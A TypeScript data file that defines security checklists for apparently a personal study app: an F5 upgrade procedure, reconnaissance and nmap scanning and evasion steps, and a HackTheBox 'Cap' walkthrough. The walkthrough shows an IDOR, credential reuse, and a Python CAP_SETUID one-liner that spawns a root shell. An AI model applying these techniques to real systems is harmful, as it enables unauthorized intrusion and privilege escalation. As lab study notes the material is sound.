import { COLORS } from "@/lib/design-tokens";

export interface ChecklistItem {
  id: string;
  label: string;
  detail?: string;
}

export interface ChecklistData {
  title: string;
  items: ChecklistItem[];
}

export const CHECKLIST_REGISTRY: Record<string, ChecklistData> = {
  "f5-update": {
    title: "F5 BigIP Update Procedure",
    items: [
      { id: "import-iso", label: "Import ISO image on the F5 appliance", detail: "Import first — takes time but doesn't change anything. Importing early saves waiting later." },
      { id: "backup-ucs", label: "Download UCS backup and save locally", detail: "Full configuration backup. If the upgrade fails, you restore from UCS." },
      { id: "license-keys", label: "Note license key details", detail: "You don't need add-on keys for registration, but keep the base key documented." },
      { id: "reactivate-license", label: "Re-activate license after ISO import completes", detail: "Wait for ISO import to finish, then reactivate. Takes 2-3 minutes." },
      { id: "verify-service-date", label: "Verify service check date", detail: "tmsh show /sys license | grep Service" },
      { id: "verify-mcp-state", label: "Check MCP state is ready", detail: "tmsh show /sys mcp-state" },
      { id: "config-verify", label: "Verify configuration integrity", detail: "load sys config verify — ensures F5 config is valid before upgrade." },
      { id: "verify-services", label: "Verify daemons are running", detail: "tmsh show sys service all" },
      { id: "install-inactive", label: "Install ISO to inactive partition", detail: "Installs to inactive partition — traffic unaffected during installation." },
      { id: "change-boot", label: "Change boot location to upgraded partition", detail: "Internal Server Error during this step is NORMAL. Instance goes OFFLINE briefly. Takes 15-20 minutes." },
      { id: "verify-traffic", label: "NAT back traffic and verify requests flow through F5", detail: "Check event logs. Confirm client requests are processed through the upgraded F5." },
    ],
  },

  "passive-enum": {
    title: "Passive Reconnaissance",
    items: [
      { id: "domain-discovery", label: "Domain & Subdomain Discovery", detail: "Tools: crt.sh, subfinder, VirusTotal. Look for dev-, staging-, api-, vpn-, internal-. Check cloud subdomains like s3-assets.company.com." },
      { id: "dns-analysis", label: "DNS Record Analysis", detail: "Tools: dig, nslookup. TXT records reveal tech stack (Google Workspace, Atlassian, Microsoft 365, Mailgun). SPF records reveal trusted network ranges." },
      { id: "dorking", label: "Search Engine Dorking", detail: "Google, Bing, DuckDuckGo. Find .log, .sql, .conf, exposed .env files, .git folders, swagger/OpenAPI docs, leaked API keys." },
      { id: "cloud-leak-check", label: "Cloud & API Leak Check", detail: "Tools: GrayHatWarfare, GitHub search. Search for company + API_KEY or PASSWORD. Check public S3 buckets or Azure Blobs." },
      { id: "staff-profiling", label: "Staff & Tech Stack Profiling", detail: "LinkedIn and job boards reveal stack. Hiring 'Senior Django + AWS Lambda' = you know their architecture." },
    ],
  },

  "semi-passive": {
    title: "Semi-Passive Enumeration",
    items: [
      { id: "shodan-censys", label: "Infrastructure Mapping (Shodan, Censys)", detail: "Look for RDP (3389), SMB (445), unauthenticated APIs (8080/8443). Search for Kubernetes dashboards or Docker APIs left exposed." },
    ],
  },

  "active-footprinting": {
    title: "Active Footprinting",
    items: [
      { id: "nmap-sweep", label: "The Initial Sweep (Nmap)", detail: "Step 1: Quick port scan (nmap -T4 -F). Step 2: Surgical version detection (nmap -sV) on found ports." },
      { id: "api-discovery", label: "API Endpoint Discovery", detail: "Look for /api/v1/, /swagger.json, /v2/users. Check for BOLA and unauthenticated endpoints." },
      { id: "microservices", label: "Microservices & Message Brokers", detail: "RabbitMQ (15672), Kafka (9092), Redis (6379), Consul (8500). Many are unauthenticated." },
      { id: "ai-exposure", label: "AI & LLM Pipeline Exposures", detail: "Jupyter Notebooks (8888), MLflow (5000), Vector DBs. Check for hardcoded API keys in frontend JS." },
    ],
  },

  "htb-cap": {
    title: "HTB Cap — Full Walkthrough",
    items: [
      { id: "scan", label: "Initial scanning — run Nmap discovery", detail: "nmap -sT 10.10.10.245 -T4 -vv → found ports 21 (FTP), 22 (SSH), 80 (HTTP)" },
      { id: "service-scan", label: "Service version scan with scripts", detail: "nmap -sC -sV -p 21,22,80 10.10.10.245 -T4 -Pn → vsftpd 3.0.3, OpenSSH 8.2p1, Gunicorn" },
      { id: "security-snapshot", label: "Trigger a Security Snapshot on the dashboard", detail: "Click the snapshot feature on the web dashboard at port 80" },
      { id: "idor-url", label: "Observe the redirect URL for IDOR testing", detail: "Browser is redirected to /data/[id]. Initial scan → /data/10" },
      { id: "idor-bruteforce", label: "Bruteforce ID range 0–10 using Burp Intruder", detail: "Test /data/0 through /data/10 for IDOR — find PCAP at /data/0" },
      { id: "pcap-found", label: "Locate PCAP with sensitive data at /data/0", detail: "PCAP file found containing plaintext FTP credentials" },
      { id: "wireshark", label: "Analyze PCAP in Wireshark to extract credentials", detail: "FTP credentials for user 'nathan' found in plaintext application layer" },
      { id: "ftp-login", label: "Log into FTP as nathan", detail: "lftp -u nathan 10.10.10.245 — confirm access and locate user flag" },
      { id: "ssh-reuse", label: "Reuse FTP credentials for SSH access", detail: "ssh nathan@10.10.10.245 — password reuse works" },
      { id: "transfer-linpeas", label: "Transfer LinPEAS to the victim machine", detail: "scp linpeas.sh nathan@10.10.10.245:/home/nathan" },
      { id: "linpeas-analysis", label: "Analyze LinPEAS output for privilege escalation vectors", detail: "Look for SUID binaries, capabilities, writable files" },
      { id: "getcap", label: "Check Linux Capabilities with getcap", detail: "getcap -r / 2>/dev/null → found cap_setuid on Python 3.8 binary" },
      { id: "privesc", label: "Abuse CAP_SETUID on Python 3.8 to get root", detail: "python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'" },
      { id: "root-flag", label: "Capture the root flag", detail: "cat /root/root.txt" },
    ],
  },

  "nmap-host-discovery": {
    title: "Host Discovery",
    items: [
      { id: "icmp-echo", label: "Determine if the host is alive (ICMP Echo)", detail: "sudo nmap -sn -PE 10.129.x.x — sends ICMP Echo requests. Fastest alive check." },
      { id: "icmp-timestamp", label: "Test ICMP Timestamp if Echo is blocked", detail: "sudo nmap -sn -PP 10.129.x.x — some firewalls block Echo but allow Timestamp." },
      { id: "tcp-syn-ping", label: "TCP SYN Ping if ICMP is fully blocked", detail: "sudo nmap -sn -PS 10.129.x.x — sends SYN to port 80 by default. Most firewalls allow this." },
      { id: "tcp-ack-ping", label: "TCP ACK Ping for stateful firewalls", detail: "sudo nmap -sn -PA 10.129.x.x — ACK packets look like responses to established connections." },
    ],
  },

  "nmap-port-scanning": {
    title: "Port Scanning",
    items: [
      { id: "top-ports", label: "Quick scan top 100 ports first", detail: "nmap -sS --top-ports=100 10.129.x.x — fast, stealthy, covers 95% of services." },
      { id: "full-scan", label: "Full port scan once you know the host is alive", detail: "nmap -sS -p- 10.129.x.x — scans all 65,535 ports. Slow but thorough." },
      { id: "service-detection", label: "Service version detection on open ports", detail: "nmap -sV -p [open_ports] 10.129.x.x — identifies service names and versions." },
      { id: "os-detection", label: "OS fingerprinting", detail: "nmap -O 10.129.x.x — guesses the operating system based on TCP/IP stack behavior." },
    ],
  },

  "nmap-evasion": {
    title: "Firewall Evasion",
    items: [
      { id: "fragment", label: "Fragment packets to bypass simple firewalls", detail: "nmap -f 10.129.x.x — splits packets into tiny fragments. Some firewalls can't reassemble." },
      { id: "mtu", label: "Custom MTU size for packet splitting", detail: "nmap --mtu 24 10.129.x.x — specify exact fragment size." },
      { id: "decoys", label: "Use decoy IPs to hide your real IP", detail: "nmap -D RND:10 10.129.x.x — generates 10 random decoy IPs. Target sees traffic from all of them." },
      { id: "source-port", label: "Spoof source port to bypass port-based rules", detail: "nmap --source-port 53 10.129.x.x — use port 53 (DNS) as source. Often allowed through firewalls." },
      { id: "scan-delay", label: "Add scan delay to avoid rate limiting", detail: "nmap --scan-delay 2s 10.129.x.x — wait 2 seconds between probes. Looks less suspicious." },
    ],
  },
};
